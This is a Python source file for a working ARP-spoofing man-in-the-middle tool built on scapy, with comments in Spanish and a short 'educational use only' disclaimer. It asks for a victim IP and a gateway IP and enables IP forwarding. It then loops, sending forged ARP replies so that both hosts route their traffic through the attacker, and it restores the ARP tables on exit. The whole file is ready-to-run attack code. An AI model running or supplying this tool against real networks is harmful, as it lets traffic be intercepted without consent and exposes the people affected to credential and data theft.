#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Tool: D31B1 ARP Spoofer (MitM)
Author: Junior (Deivi) - D31B1
Description: Advanced ARP Spoofing tool with auto-forwarding and clean exit.
             Intercepts traffic between a Target and Gateway.
Disclaimer: EDUCATIONAL USE ONLY. Authorized labs/networks only.
"""

import sys
import time
import os
from scapy.all import *

# --- CONFIGURACIÓN ---
TOOL_NAME = "D31B1 ARP POISON"
VERSION = "1.0.0 (Stable)"

def banner():
    print("\n" + "="*60)
    print(f" 🕵️‍♂️  {TOOL_NAME} - {VERSION}  🕵️‍♂️")
    print(f"     >> Created by: Junior (D31B1)")
    print(f"     >> Mode: Man-in-the-Middle (Active)")
    print("="*60)

def enable_forwarding():
    """ Habilita el reenvío de paquetes en Linux (Kali) """
    print("[*] Enabling IP Forwarding (so the target has internet)...")
    if os.name == 'nt':
        print("[!] Windows detected: Please enable IP Routing manually.")
    else:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(ip):
    """ Obtiene la MAC de una IP enviando una solicitud ARP """
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    """ Envía el paquete venenoso """
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Error: Could not find MAC for {target_ip}. Is it down?")
        return
    # Op=2 es respuesta ARP (is-at)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(dest_ip, source_ip):
    """ Restaura la tabla ARP a la normalidad al cerrar """
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

def main():
    banner()

    # 1. Obtener IPs
    target_ip = input("\n[?] Target IP (Victim): ").strip()
    gateway_ip = input("[?] Gateway IP (Router): ").strip()

    if not target_ip or not gateway_ip:
        print("[!] Error: You must provide both IPs.")
        sys.exit(1)

    # 2. Preparar ataque
    enable_forwarding()
    print(f"\n[*] Target: {target_ip} | Gateway: {gateway_ip}")
    print("[*] Resolving MAC addresses...")

    try:
        packets_sent = 0
        print("\n[+] 💉 POISONING STARTED! (Intercepting traffic...)")
        print("[!] Press CTRL+C to stop and restore network.")
        
        while True:
            # Engañar a la víctima: "Yo soy el Router"
            spoof(target_ip, gateway_ip)
            # Engañar al Router: "Yo soy la víctima"
            spoof(gateway_ip, target_ip)
            
            packets_sent += 2
            sys.stdout.write(f"\r[+] Packets Sent: {packets_sent}")
            sys.stdout.flush()
            time.sleep(2) # Intervalo de seguridad

    except KeyboardInterrupt:
        print("\n\n[!] Detected CTRL+C. Stopping attack...")
        print("[*] Restoring ARP Tables (Cleaning up)...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[*] Network restored. Exiting.")

if __name__ == "__main__":
    main()